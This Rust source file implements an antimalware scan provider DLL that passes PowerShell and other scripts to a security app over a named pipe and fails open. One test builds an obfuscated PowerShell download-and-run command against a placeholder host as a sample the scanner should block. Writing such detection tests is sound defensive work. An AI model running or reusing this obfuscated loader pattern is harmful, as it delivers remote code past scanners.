//! Hexward's AMSI provider (`hexward_amsi.dll`).
//!
//! Windows' Antimalware Scan Interface hands every script PowerShell, Windows Script Host
//! (VBScript/JScript), Office VBA and .NET are about to run to registered providers, after the
//! script has been decoded, so obfuscation and in-memory payloads are visible.
//!
//! This DLL is deliberately thin. It runs inside other programs (PowerShell, Word), so it
//! does no scanning itself: it passes the script to the Hexward app over a local named pipe and
//! returns the app's verdict. If the app isn't running or doesn't answer within 3 seconds, the
//! script runs as usual ("fail open"), so Hexward can never make PowerShell hang or crash.
//!
//! Protocol on `\\.\pipe\hexward-amsi` (one request per connection):
//!   request:  b"HXA1", u32 LE app-name length, app name (UTF-8), u32 LE content length, content
//!   response: one byte, 0 = clean, 1 = block
//!
//! Registration (admin): `regsvr32 hexward_amsi.dll` writes the COM class and the AMSI provider
//! key under HKLM; `regsvr32 /u` removes them. Hexward installs the DLL into Program Files first,
//! so a normal user can't swap it.

#![allow(clippy::missing_safety_doc)]

pub const PIPE: &str = r"\\.\pipe\hexward-amsi";
pub const MAGIC: &[u8; 4] = b"HXA1";
pub const MAX_CONTENT: usize = 8 * 1024 * 1024;
/// {3F8E2B91-6C47-4D2A-B5E8-9A1C7D4F2E63}
pub const CLSID_STR: &str = "{3F8E2B91-6C47-4D2A-B5E8-9A1C7D4F2E63}";

/// Builds a request for the pipe.
pub fn encode(app: &str, content: &[u8]) -> Vec<u8> {
    let content = &content[..content.len().min(MAX_CONTENT)];
    let mut v = Vec::with_capacity(12 + app.len() + content.len());
    v.extend_from_slice(MAGIC);
    v.extend_from_slice(&(app.len() as u32).to_le_bytes());
    v.extend_from_slice(app.as_bytes());
    v.extend_from_slice(&(content.len() as u32).to_le_bytes());
    v.extend_from_slice(content);
    v
}

/// Parses a request (used by the app's pipe server).
pub fn decode(b: &[u8]) -> Option<(String, &[u8])> {
    if b.get(..4)? != MAGIC {
        return None;
    }
    let al = u32::from_le_bytes(b.get(4..8)?.try_into().ok()?) as usize;
    let app = String::from_utf8_lossy(b.get(8..8 + al)?).into_owned();
    let o = 8 + al;
    let cl = u32::from_le_bytes(b.get(o..o + 4)?.try_into().ok()?) as usize;
    Some((app, b.get(o + 4..o + 4 + cl.min(MAX_CONTENT))?))
}

#[cfg(windows)]
mod com {
    use std::ffi::c_void;
    use std::sync::atomic::{AtomicI32, AtomicU32, Ordering};

    use windows_sys::Win32::Foundation::{CLASS_E_CLASSNOTAVAILABLE, CloseHandle, E_NOINTERFACE, E_POINTER, ERROR_IO_PENDING, ERROR_PIPE_BUSY, GENERIC_READ, GENERIC_WRITE, GetLastError, HMODULE, INVALID_HANDLE_VALUE, S_FALSE, S_OK};
    use windows_sys::Win32::Storage::FileSystem::{CreateFileW, FILE_FLAG_OVERLAPPED, OPEN_EXISTING, ReadFile, WriteFile};
    use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResultEx, OVERLAPPED};
    use windows_sys::Win32::System::Pipes::WaitNamedPipeW;
    use windows_sys::Win32::System::Threading::CreateEventW;
    use windows_sys::core::{GUID, HRESULT};

    const AMSI_ATTRIBUTE_APP_NAME: i32 = 0;
    const AMSI_ATTRIBUTE_CONTENT_SIZE: i32 = 2;
    const AMSI_ATTRIBUTE_CONTENT_ADDRESS: i32 = 3;
    const AMSI_RESULT_NOT_DETECTED: i32 = 1;
    const AMSI_RESULT_DETECTED: i32 = 32768;

    pub const CLSID: GUID = GUID { data1: 0x3F8E2B91, data2: 0x6C47, data3: 0x4D2A, data4: [0xB5, 0xE8, 0x9A, 0x1C, 0x7D, 0x4F, 0x2E, 0x63] };
    const IID_IUNKNOWN: GUID = GUID { data1: 0, data2: 0, data3: 0, data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46] };
    const IID_ICLASSFACTORY: GUID = GUID { data1: 1, data2: 0, data3: 0, data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46] };
    /// IAntimalwareProvider {b2cabfe3-fe04-42b1-a5df-08d483d4d125}
    const IID_IANTIMALWAREPROVIDER: GUID = GUID { data1: 0xb2cabfe3, data2: 0xfe04, data3: 0x42b1, data4: [0xa5, 0xdf, 0x08, 0xd4, 0x83, 0xd4, 0xd1, 0x25] };

    fn eq(a: &GUID, b: &GUID) -> bool {
        a.data1 == b.data1 && a.data2 == b.data2 && a.data3 == b.data3 && a.data4 == b.data4
    }

    pub static OBJECTS: AtomicI32 = AtomicI32::new(0);
    pub static LOCKS: AtomicI32 = AtomicI32::new(0);
    pub static mut MODULE: HMODULE = std::ptr::null_mut();

    // ---- IAmsiStream (implemented by Windows; we only call it) ----

    #[repr(C)]
    pub struct IAmsiStreamVtbl {
        pub query_interface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
        pub add_ref: unsafe extern "system" fn(*mut c_void) -> u32,
        pub release: unsafe extern "system" fn(*mut c_void) -> u32,
        pub get_attribute: unsafe extern "system" fn(*mut c_void, i32, u32, *mut u8, *mut u32) -> HRESULT,
        pub read: unsafe extern "system" fn(*mut c_void, u64, u32, *mut u8, *mut u32) -> HRESULT,
    }

    #[repr(C)]
    pub struct IAmsiStream {
        pub vtbl: *const IAmsiStreamVtbl,
    }

    // ---- our provider ----

    #[repr(C)]
    struct ProviderVtbl {
        query_interface: unsafe extern "system" fn(*mut Provider, *const GUID, *mut *mut c_void) -> HRESULT,
        add_ref: unsafe extern "system" fn(*mut Provider) -> u32,
        release: unsafe extern "system" fn(*mut Provider) -> u32,
        scan: unsafe extern "system" fn(*mut Provider, *mut IAmsiStream, *mut i32) -> HRESULT,
        close_session: unsafe extern "system" fn(*mut Provider, u64),
        display_name: unsafe extern "system" fn(*mut Provider, *mut *mut u16) -> HRESULT,
    }

    #[repr(C)]
    pub struct Provider {
        vtbl: *const ProviderVtbl,
        refs: AtomicU32,
    }

    static PROVIDER_VTBL: ProviderVtbl = ProviderVtbl { query_interface: p_qi, add_ref: p_add_ref, release: p_release, scan: p_scan, close_session: p_close, display_name: p_display_name };

    unsafe extern "system" fn p_qi(this: *mut Provider, iid: *const GUID, out: *mut *mut c_void) -> HRESULT {
        if out.is_null() || iid.is_null() {
            return E_POINTER;
        }
        // SAFETY: COM contract: `iid` and `out` are valid pointers supplied by the caller.
        unsafe {
            if eq(&*iid, &IID_IUNKNOWN) || eq(&*iid, &IID_IANTIMALWAREPROVIDER) {
                p_add_ref(this);
                *out = this.cast();
                S_OK
            } else {
                *out = std::ptr::null_mut();
                E_NOINTERFACE
            }
        }
    }
    unsafe extern "system" fn p_add_ref(this: *mut Provider) -> u32 {
        // SAFETY: `this` is a live Provider created by `new_provider`.
        unsafe { (*this).refs.fetch_add(1, Ordering::SeqCst) + 1 }
    }
    unsafe extern "system" fn p_release(this: *mut Provider) -> u32 {
        // SAFETY: `this` was created by Box::into_raw in `new_provider`; freed once at zero.
        unsafe {
            let n = (*this).refs.fetch_sub(1, Ordering::SeqCst) - 1;
            if n == 0 {
                drop(Box::from_raw(this));
                OBJECTS.fetch_sub(1, Ordering::SeqCst);
            }
            n
        }
    }
    unsafe extern "system" fn p_close(_this: *mut Provider, _session: u64) {}
    unsafe extern "system" fn p_display_name(_this: *mut Provider, out: *mut *mut u16) -> HRESULT {
        if out.is_null() {
            return E_POINTER;
        }
        let name: Vec<u16> = "Hexward".encode_utf16().chain(std::iter::once(0)).collect();
        // SAFETY: the caller frees the string with CoTaskMemFree, as the interface requires.
        unsafe {
            let p = windows_sys::Win32::System::Com::CoTaskMemAlloc(name.len() * 2) as *mut u16;
            if p.is_null() {
                return windows_sys::Win32::Foundation::E_OUTOFMEMORY;
            }
            std::ptr::copy_nonoverlapping(name.as_ptr(), p, name.len());
            *out = p;
        }
        S_OK
    }

    /// Reads the script and its app name from the stream Windows gives us.
    pub unsafe fn read_stream(stream: *mut IAmsiStream) -> Option<(String, Vec<u8>)> {
        // SAFETY: `stream` is a valid IAmsiStream for the duration of Scan (COM contract).
        unsafe {
            let vt = &*(*stream).vtbl;
            let mut name = [0u8; 1024];
            let mut got = 0u32;
            let app = if (vt.get_attribute)(stream.cast(), AMSI_ATTRIBUTE_APP_NAME, name.len() as u32, name.as_mut_ptr(), &mut got) >= 0 {
                let units: Vec<u16> = name[..(got as usize).min(name.len())].as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).take_while(|&u| u != 0).collect();
                String::from_utf16_lossy(&units)
            } else {
                String::new()
            };
            let mut size = 0u64;
            (vt.get_attribute)(stream.cast(), AMSI_ATTRIBUTE_CONTENT_SIZE, 8, (&mut size as *mut u64).cast(), &mut got);
            let size = (size as usize).min(crate::MAX_CONTENT);
            if size == 0 {
                return None;
            }
            let mut addr: usize = 0;
            let have_addr = (vt.get_attribute)(stream.cast(), AMSI_ATTRIBUTE_CONTENT_ADDRESS, std::mem::size_of::<usize>() as u32, (&mut addr as *mut usize).cast(), &mut got) >= 0 && addr != 0;
            let content = if have_addr {
                std::slice::from_raw_parts(addr as *const u8, size).to_vec()
            } else {
                let mut buf = vec![0u8; size];
                let mut read = 0u32;
                if (vt.read)(stream.cast(), 0, size as u32, buf.as_mut_ptr(), &mut read) < 0 {
                    return None;
                }
                buf.truncate(read as usize);
                buf
            };
            Some((app, content))
        }
    }

    unsafe extern "system" fn p_scan(_this: *mut Provider, stream: *mut IAmsiStream, result: *mut i32) -> HRESULT {
        if stream.is_null() || result.is_null() {
            return E_POINTER;
        }
        // SAFETY: valid pointers per the AMSI contract; a panic must never cross into the host.
        unsafe {
            *result = AMSI_RESULT_NOT_DETECTED;
            let verdict = std::panic::catch_unwind(|| read_stream(stream).and_then(|(app, content)| ask(&crate::encode(&app, &content)))).ok().flatten();
            if verdict == Some(true) {
                *result = AMSI_RESULT_DETECTED;
            }
        }
        S_OK
    }

    fn wait_io(h: *mut c_void, ov: &OVERLAPPED, started: bool, ms: u32) -> Option<u32> {
        let mut n = 0u32;
        // SAFETY: `h` and `ov` stay valid until the operation completes or is cancelled here.
        unsafe {
            if !started && GetLastError() != ERROR_IO_PENDING {
                return None;
            }
            if GetOverlappedResultEx(h, ov, &mut n, ms, 0) == 0 {
                CancelIoEx(h, ov);
                GetOverlappedResultEx(h, ov, &mut n, u32::MAX, 0);
                return None;
            }
        }
        Some(n)
    }

    /// Sends one request to the Hexward app. None = no answer (fail open).
    pub fn ask(request: &[u8]) -> Option<bool> {
        let pipe: Vec<u16> = crate::PIPE.encode_utf16().chain(std::iter::once(0)).collect();
        // SAFETY: plain Win32 calls on handles owned and closed in this function.
        unsafe {
            let mut h = CreateFileW(pipe.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, std::ptr::null(), OPEN_EXISTING, FILE_FLAG_OVERLAPPED, std::ptr::null_mut());
            if h == INVALID_HANDLE_VALUE {
                if GetLastError() != ERROR_PIPE_BUSY || WaitNamedPipeW(pipe.as_ptr(), 500) == 0 {
                    return None;
                }
                h = CreateFileW(pipe.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, std::ptr::null(), OPEN_EXISTING, FILE_FLAG_OVERLAPPED, std::ptr::null_mut());
                if h == INVALID_HANDLE_VALUE {
                    return None;
                }
            }
            let event = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
            let mut ov: OVERLAPPED = std::mem::zeroed();
            ov.hEvent = event;
            let mut answer = None;
            let wrote = WriteFile(h, request.as_ptr(), request.len() as u32, std::ptr::null_mut(), &mut ov) != 0;
            if wait_io(h, &ov, wrote, 3000) == Some(request.len() as u32) {
                let mut ov2: OVERLAPPED = std::mem::zeroed();
                ov2.hEvent = event;
                let mut byte = [0u8; 1];
                let read = ReadFile(h, byte.as_mut_ptr(), 1, std::ptr::null_mut(), &mut ov2) != 0;
                if wait_io(h, &ov2, read, 3000) == Some(1) {
                    answer = Some(byte[0] == 1);
                }
            }
            CloseHandle(event);
            CloseHandle(h);
            answer
        }
    }

    pub fn new_provider() -> *mut Provider {
        OBJECTS.fetch_add(1, Ordering::SeqCst);
        Box::into_raw(Box::new(Provider { vtbl: &PROVIDER_VTBL, refs: AtomicU32::new(1) }))
    }

    // ---- class factory (a static object) ----

    #[repr(C)]
    struct FactoryVtbl {
        query_interface: unsafe extern "system" fn(*mut Factory, *const GUID, *mut *mut c_void) -> HRESULT,
        add_ref: unsafe extern "system" fn(*mut Factory) -> u32,
        release: unsafe extern "system" fn(*mut Factory) -> u32,
        create_instance: unsafe extern "system" fn(*mut Factory, *mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
        lock_server: unsafe extern "system" fn(*mut Factory, i32) -> HRESULT,
    }

    #[repr(C)]
    pub struct Factory {
        vtbl: *const FactoryVtbl,
    }

    static FACTORY_VTBL: FactoryVtbl = FactoryVtbl { query_interface: f_qi, add_ref: f_add_ref, release: f_release, create_instance: f_create, lock_server: f_lock };
    pub static mut FACTORY: Factory = Factory { vtbl: &FACTORY_VTBL };

    unsafe extern "system" fn f_qi(this: *mut Factory, iid: *const GUID, out: *mut *mut c_void) -> HRESULT {
        if out.is_null() || iid.is_null() {
            return E_POINTER;
        }
        // SAFETY: COM contract.
        unsafe {
            if eq(&*iid, &IID_IUNKNOWN) || eq(&*iid, &IID_ICLASSFACTORY) {
                *out = this.cast();
                S_OK
            } else {
                *out = std::ptr::null_mut();
                E_NOINTERFACE
            }
        }
    }
    unsafe extern "system" fn f_add_ref(_this: *mut Factory) -> u32 {
        2
    }
    unsafe extern "system" fn f_release(_this: *mut Factory) -> u32 {
        1
    }
    unsafe extern "system" fn f_create(_this: *mut Factory, outer: *mut c_void, iid: *const GUID, out: *mut *mut c_void) -> HRESULT {
        if !outer.is_null() {
            return windows_sys::Win32::Foundation::CLASS_E_NOAGGREGATION;
        }
        let p = new_provider();
        // SAFETY: `p` is a fresh provider with one reference; QI adds one, Release drops ours.
        unsafe {
            let hr = p_qi(p, iid, out);
            p_release(p);
            hr
        }
    }
    unsafe extern "system" fn f_lock(_this: *mut Factory, lock: i32) -> HRESULT {
        if lock != 0 {
            LOCKS.fetch_add(1, Ordering::SeqCst);
        } else {
            LOCKS.fetch_sub(1, Ordering::SeqCst);
        }
        S_OK
    }

    pub fn class_object(clsid: &GUID, iid: &GUID, out: *mut *mut c_void) -> HRESULT {
        if !eq(clsid, &CLSID) {
            return CLASS_E_CLASSNOTAVAILABLE;
        }
        // SAFETY: FACTORY is a static that lives forever; f_qi only reads it.
        unsafe { f_qi(&raw mut FACTORY, iid, out) }
    }

    pub fn can_unload() -> HRESULT {
        if OBJECTS.load(Ordering::SeqCst) == 0 && LOCKS.load(Ordering::SeqCst) == 0 { S_OK } else { S_FALSE }
    }
}

// ---- registration ----

#[cfg(windows)]
fn module_path() -> Option<String> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;
    let mut buf = [0u16; 1024];
    // SAFETY: MODULE is set in DllMain before any export runs.
    let n = unsafe { GetModuleFileNameW(com::MODULE, buf.as_mut_ptr(), buf.len() as u32) } as usize;
    (n > 0).then(|| String::from_utf16_lossy(&buf[..n]))
}

#[cfg(windows)]
fn reg_set(path: &str, name: Option<&str>, value: &str) -> bool {
    use windows_sys::Win32::System::Registry::{HKEY, HKEY_LOCAL_MACHINE, KEY_WRITE, REG_OPTION_NON_VOLATILE, REG_SZ, RegCloseKey, RegCreateKeyExW, RegSetValueExW};
    let w = |s: &str| -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() };
    let (p, v) = (w(path), w(value));
    let n = name.map(w);
    // SAFETY: buffers outlive the calls; the key handle is closed.
    unsafe {
        let mut key: HKEY = std::ptr::null_mut();
        if RegCreateKeyExW(HKEY_LOCAL_MACHINE, p.as_ptr(), 0, std::ptr::null(), REG_OPTION_NON_VOLATILE, KEY_WRITE, std::ptr::null(), &mut key, std::ptr::null_mut()) != 0 {
            return false;
        }
        let ok = RegSetValueExW(key, n.as_ref().map_or(std::ptr::null(), |n| n.as_ptr()), 0, REG_SZ, v.as_ptr().cast(), (v.len() * 2) as u32) == 0;
        RegCloseKey(key);
        ok
    }
}

#[cfg(windows)]
fn reg_delete_tree(path: &str) {
    use windows_sys::Win32::System::Registry::{HKEY_LOCAL_MACHINE, RegDeleteTreeW};
    let p: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    // SAFETY: plain registry call.
    unsafe {
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, p.as_ptr());
    }
}

#[cfg(windows)]
#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllMain(module: windows_sys::Win32::Foundation::HMODULE, reason: u32, _reserved: *mut std::ffi::c_void) -> i32 {
    if reason == windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH {
        // SAFETY: written once while the loader lock is held, before any other export runs.
        unsafe {
            com::MODULE = module;
        }
    }
    1
}

#[cfg(windows)]
#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllGetClassObject(clsid: *const windows_sys::core::GUID, iid: *const windows_sys::core::GUID, out: *mut *mut std::ffi::c_void) -> windows_sys::core::HRESULT {
    if clsid.is_null() || iid.is_null() || out.is_null() {
        return windows_sys::Win32::Foundation::E_POINTER;
    }
    // SAFETY: pointers checked above; COM contract.
    unsafe { com::class_object(&*clsid, &*iid, out) }
}

#[cfg(windows)]
#[unsafe(no_mangle)]
pub extern "system" fn DllCanUnloadNow() -> windows_sys::core::HRESULT {
    com::can_unload()
}

#[cfg(windows)]
#[unsafe(no_mangle)]
pub extern "system" fn DllRegisterServer() -> windows_sys::core::HRESULT {
    let Some(path) = module_path() else { return windows_sys::Win32::Foundation::E_FAIL };
    let clsid_key = format!(r"SOFTWARE\Classes\CLSID\{CLSID_STR}");
    let ok = reg_set(&clsid_key, None, "Hexward AMSI provider")
        && reg_set(&format!(r"{clsid_key}\InprocServer32"), None, &path)
        && reg_set(&format!(r"{clsid_key}\InprocServer32"), Some("ThreadingModel"), "Both")
        && reg_set(&format!(r"SOFTWARE\Microsoft\AMSI\Providers\{CLSID_STR}"), None, "Hexward");
    if ok { windows_sys::Win32::Foundation::S_OK } else { windows_sys::Win32::Foundation::E_ACCESSDENIED }
}

#[cfg(windows)]
#[unsafe(no_mangle)]
pub extern "system" fn DllUnregisterServer() -> windows_sys::core::HRESULT {
    reg_delete_tree(&format!(r"SOFTWARE\Microsoft\AMSI\Providers\{CLSID_STR}"));
    reg_delete_tree(&format!(r"SOFTWARE\Classes\CLSID\{CLSID_STR}"));
    windows_sys::Win32::Foundation::S_OK
}

#[cfg(all(test, windows))]
mod tests {
    use super::com::*;
    use super::*;
    use std::ffi::c_void;

    #[test]
    fn protocol_round_trip() {
        let req = encode("PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0", b"W\0r\0i\0t\0e\0");
        let (app, content) = decode(&req).unwrap();
        assert!(app.starts_with("PowerShell"));
        assert_eq!(content, b"W\0r\0i\0t\0e\0");
        assert!(decode(b"nope").is_none());
        assert!(decode(&req[..10]).is_none());
    }

    // A fake IAmsiStream, as Windows would pass to Scan.
    #[repr(C)]
    struct FakeStream {
        vtbl: *const IAmsiStreamVtbl,
        app: Vec<u16>,
        content: Vec<u8>,
    }
    unsafe extern "system" fn s_qi(_: *mut c_void, _: *const windows_sys::core::GUID, _: *mut *mut c_void) -> i32 {
        -1
    }
    unsafe extern "system" fn s_ref(_: *mut c_void) -> u32 {
        1
    }
    unsafe extern "system" fn s_attr(this: *mut c_void, attr: i32, size: u32, data: *mut u8, ret: *mut u32) -> i32 {
        // SAFETY: test-only; `this` is a FakeStream and buffers are sized by the caller.
        unsafe {
            let s = &*(this as *const FakeStream);
            match attr {
                0 => {
                    let bytes: Vec<u8> = s.app.iter().flat_map(|u| u.to_le_bytes()).collect();
                    std::ptr::copy_nonoverlapping(bytes.as_ptr(), data, bytes.len().min(size as usize));
                    *ret = bytes.len() as u32;
                    0
                }
                2 => {
                    *(data as *mut u64) = s.content.len() as u64;
                    *ret = 8;
                    0
                }
                3 => {
                    *(data as *mut usize) = s.content.as_ptr() as usize;
                    *ret = 8;
                    0
                }
                _ => -1,
            }
        }
    }
    unsafe extern "system" fn s_read(_: *mut c_void, _: u64, _: u32, _: *mut u8, _: *mut u32) -> i32 {
        -1
    }
    static FAKE_VTBL: IAmsiStreamVtbl = IAmsiStreamVtbl { query_interface: s_qi, add_ref: s_ref, release: s_ref, get_attribute: s_attr, read: s_read };

    /// With the Hexward app running: `cargo test -p hexward-amsi -- --ignored`.
    #[test]
    #[ignore]
    fn live_app_blocks_hidden_download_and_run() {
        let j = |p: &[&str]| p.concat();
        let inner = j(&["IE", "X (New-Object Net.WebClient).Downl", "oadString('http://x.invalid/a')"]);
        let codes: Vec<String> = inner.bytes().map(|b| format!("[char]{b}")).collect();
        let script = format!("$c = {}; & ([scriptblock]::Create($c))", codes.join("+"));
        let utf16: Vec<u8> = script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        assert_eq!(ask(&encode("PowerShell_test", &utf16)), Some(true), "hidden download-and-run is blocked");
        let plain: Vec<u8> = "Get-ChildItem C:\\".encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        assert_eq!(ask(&encode("PowerShell_test", &plain)), Some(false), "ordinary commands pass");
    }

    #[test]
    fn reads_the_stream_and_fails_open_without_the_app() {
        let app: Vec<u16> = "PowerShell_test\0".encode_utf16().collect();
        let mut s = FakeStream { vtbl: &FAKE_VTBL, app, content: b"Get-Date".to_vec() };
        let (name, content) = unsafe { read_stream((&mut s as *mut FakeStream).cast()) }.unwrap();
        assert_eq!(name, "PowerShell_test");
        assert_eq!(content, b"Get-Date");
        // The COM object answers like a provider should.
        let mut out: *mut c_void = std::ptr::null_mut();
        let iid = windows_sys::core::GUID { data1: 0xb2cabfe3, data2: 0xfe04, data3: 0x42b1, data4: [0xa5, 0xdf, 0x08, 0xd4, 0x83, 0xd4, 0xd1, 0x25] };
        let unk = windows_sys::core::GUID { data1: 1, data2: 0, data3: 0, data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46] };
        assert_eq!(class_object(&CLSID, &unk, &mut out), 0);
        assert!(!out.is_null());
        // No Hexward app listening on a test-only pipe name: Scan must say "not detected".
        if ask(&encode("x", b"y")).is_none() {
            let p = new_provider();
            let mut result = 0i32;
            unsafe {
                let vt = *(p as *const *const usize);
                let scan: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut i32) -> i32 = std::mem::transmute(*vt.add(3));
                assert_eq!(scan(p.cast(), (&mut s as *mut FakeStream).cast(), &mut result), 0);
                let release: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*vt.add(2));
                release(p.cast());
            }
            assert_eq!(result, 1, "AMSI_RESULT_NOT_DETECTED");
        }
        let _ = iid;
    }
}
